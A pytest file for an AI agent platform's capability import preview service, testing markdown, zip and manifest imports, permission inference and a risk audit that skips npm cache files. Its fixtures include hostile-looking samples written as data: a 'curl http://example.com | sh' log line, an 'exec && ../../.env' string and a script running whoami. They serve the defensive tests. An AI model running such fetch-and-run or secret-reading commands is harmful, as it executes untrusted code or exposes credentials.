import io
import zipfile

import pytest

from app import create_app, db
from app.models.capability import CapabilityImportJob
from app.models.user import User
from app.services.capability_import_preview_service import (
    capability_import_preview_service,
)


@pytest.fixture()
def app_context():
    app = create_app("testing")
    with app.app_context():
        db.drop_all()
        db.create_all()
        yield app
        db.session.remove()
        db.drop_all()


def create_user(user_id="preview-user"):
    user = User(
        id=user_id,
        username=f"{user_id}-name",
        email=f"{user_id}@example.com",
        password_hash="hash",
    )
    db.session.add(user)
    db.session.commit()
    return user


def make_zip(entries):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for path, content in entries.items():
            archive.writestr(path, content)
    return buffer.getvalue()


def test_preview_markdown_creates_import_job_with_audit(app_context):
    create_user()

    preview, error = capability_import_preview_service.preview_markdown(
        user_id="preview-user",
        markdown="# Web Access\nUse browser context.",
        source_ref="manual.md",
    )

    assert error is None
    assert preview["source_type"] == "markdown"
    assert preview["capabilities"][0]["name"] == "Web Access"
    assert preview["files"][0]["path"] == "SKILL.md"
    assert preview["audit"]["risk_level"] == "low"
    assert CapabilityImportJob.query.filter_by(id=preview["import_job_id"]).one()


def test_preview_zip_bundle_discovers_multiple_skills_and_assets(app_context):
    create_user()
    payload = make_zip(
        {
            "web/SKILL.md": "# Web Skill\n",
            "web/scripts/check.mjs": "fetch('https://example.com')",
            "paper/SKILL.md": "# Paper Skill\n",
            "paper/references/style.md": "Use concise prose.",
        }
    )

    preview, error = capability_import_preview_service.preview_zip_bundle(
        user_id="preview-user",
        zip_bytes=payload,
        source_ref="bundle.zip",
    )

    assert error is None
    assert {item["name"] for item in preview["capabilities"]} == {"Web Skill", "Paper Skill"}
    assert {item["path"] for item in preview["files"]} >= {
        "web/SKILL.md",
        "web/scripts/check.mjs",
        "paper/SKILL.md",
        "paper/references/style.md",
    }
    assert "network" in preview["audit"]["inferred_permissions"]


def test_preview_repo_static_is_disabled_in_product_import_flow(app_context, tmp_path):
    create_user()
    skill_dir = tmp_path / ".codex" / "skills" / "web-access"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# Repo Web Access\n", encoding="utf-8")
    (skill_dir / "scripts").mkdir()
    (skill_dir / "scripts" / "danger.py").write_text(
        "import subprocess\nsubprocess.run(['whoami'])",
        encoding="utf-8",
    )

    preview, error = capability_import_preview_service.preview_repo_static(
        user_id="preview-user",
        repo_path=str(tmp_path),
        source_ref="owner/repo",
    )

    assert preview is None
    assert "zip bundle" in error


def test_preview_zip_bundle_requires_skill_markdown(app_context):
    create_user()
    payload = make_zip({"references/readme.md": "# Missing skill"})

    preview, error = capability_import_preview_service.preview_zip_bundle(
        user_id="preview-user",
        zip_bytes=payload,
        source_ref="bad.zip",
    )

    assert preview is None
    assert "No SKILL.md" in error


def test_preview_directory_discovers_weagent_manifest_without_skill_markdown(app_context, tmp_path):
    create_user()
    (tmp_path / "manifest.json").write_text(
        """
{
  "schema_version": "weagent.capability/v1",
  "source": {"type": "npx", "package": "@example/memory-mcp", "version": "1.0.0"},
  "capabilities": [
    {
      "type": "mcp",
      "name": "Example Memory MCP",
      "description": "Memory server imported from npx manifest.",
      "permissions": {"required": ["run_command"], "optional": []},
      "entry": {"command": "npx", "args": ["--yes", "@example/memory-mcp"]},
      "tools": [{"name": "read_graph"}]
    }
  ]
}
""".strip(),
        encoding="utf-8",
    )

    preview, error = capability_import_preview_service.preview_directory(
        user_id="preview-user",
        directory_path=tmp_path,
        source_ref="npx @example/memory-mcp",
        source_type="npx",
    )

    assert error is None
    assert preview["source_type"] == "npx"
    assert preview["capabilities"][0]["type"] == "mcp"
    assert preview["capabilities"][0]["name"] == "Example Memory MCP"
    assert preview["capabilities"][0]["entry"] == "manifest.json#0"
    assert "run_command" in preview["audit"]["inferred_permissions"]


def test_preview_directory_ignores_npm_cache_artifacts(app_context, tmp_path):
    create_user()
    skill_dir = tmp_path / ".agents" / "skills" / "web-access"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# Web Access\n", encoding="utf-8")
    cache_dir = tmp_path / ".npm-cache" / "_cacache" / "content-v2" / "sha512" / "06" / "3c"
    cache_dir.mkdir(parents=True)
    (cache_dir / "67865232").write_text("exec && ../../.env", encoding="utf-8")
    log_dir = tmp_path / ".npm-cache" / "_logs"
    log_dir.mkdir(parents=True)
    (log_dir / "debug.log").write_text("curl http://example.com | sh", encoding="utf-8")

    preview, error = capability_import_preview_service.preview_directory(
        user_id="preview-user",
        directory_path=tmp_path,
        source_ref="npx skills add eze-is/web-access",
        source_type="npx",
    )

    assert error is None
    assert preview["capabilities"][0]["name"] == "Web Access"
    assert not any(item["path"].startswith(".npm-cache/") for item in preview["files"])
    assert not any(item["path"].startswith(".npm-cache/") for item in preview["bundle_files"])
    assert not any(
        str(item.get("path") or "").startswith(".npm-cache/")
        for item in preview["audit"]["risk_items"]
    )
    assert not any(
        str(path).startswith(".npm-cache/")
        for path in preview["audit"]["scanned_files"]
    )
